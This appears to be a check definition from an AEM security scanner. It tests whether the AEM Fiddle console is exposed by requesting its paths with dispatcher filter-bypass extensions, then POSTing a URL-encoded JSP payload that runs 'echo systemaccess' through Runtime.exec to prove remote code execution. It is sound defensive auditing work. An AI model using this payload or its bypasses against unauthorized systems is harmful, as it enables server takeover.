/*
 * (C) Copyright 2022 Netcentric - a Cognizant Digital Business
 *
 * All rights reserved. This program and the accompanying materials
 * are made available under the terms of the Eclipse Public License v1.0
 * which accompanies this distribution, and is available at
 * http://www.eclipse.org/legal/epl-v10.html
 */
import biz.netcentric.security.checkerdsl.dsl.securitycheck.HttpSecurityCheck
import biz.netcentric.security.checkerdsl.model.Severity


HttpSecurityCheck.create{

    id "nc-FidAemHa"

    name "AEM Fiddle Check"

    vulnerability {
        name "Remote Code Execution: ${name}"
        description '''Checks wether the AEM fiddle console is available/accessible and can be exploited. AEM fiddle is web editor which allows to execute code on the AEM instance itself.'''
        remediation "Uninstall it completely as it must not be present on a production instance at all."
        cve ""
        severity Severity.HIGH
    }

    categories 'aem-misconfig','rce'

    steps([
            {
                name "GET request to audit servlet paths"

                reportable true

                paths {
                    ['/etc/acs-tools/aem-fiddle', '/etc/acs-tools/aem-fiddle.html']
                }

                extensions FilterEvasion.SERVLET_ENUMERATION_WITH_BYPASS_PLACEHOLDER.getRandomizedBypasses(9)

                method "GET"
                detect {
                    all {
                        checkStatusCode 200
                        bodyContains "Fiddle"
                    }
                }
            },
            {
                name "POST request to aem fiddle endpoint"

                paths {
                    ['/etc/acs-tools/aem-fiddle/_jcr_content.run']
                }
                requestHeaders {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
                extensions FilterEvasion.HTML_DISPATCHER_BYPASS_EXTENSIONS.getRandomizedBypasses(9)

                def data = """%3C%25%40page+import%3D%22java.io.%2A%22+%25%3E%0D%0A%3C%25%0D%0A%09BufferedReader+in+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%22echo+systemaccess%22%29.getInputStream%28%29%29%29%3B%0D%0A%09StringBuilder+sb+%3D+new+StringBuilder%28%29%3B%0D%0A%09String+s+%3D+null%3B%0D%0A%09while%28%28s%3Din.readLine%28%29%29+%21%3D+null%29+%7B%0D%0A%09%09sb.append%28s+%2B+%22%5C%5C%5C%5Cn%22%29%3B%0D%0A%09%7D%0D%0A%09String+data+%3D+sb.toString%28%29%3B%0D%0A%25%3E%0D%0Ascriptdata%3D%0D%0A%3C%25%3Ddata+%25%3E%26scriptext%3Djsp%26resource%3D"""

                body "text/html", "UTF-8", { data }

                method "POST"
                detect {
                    all {
                        bodyContains "systemaccess"
                    }
                }
            }
    ])

}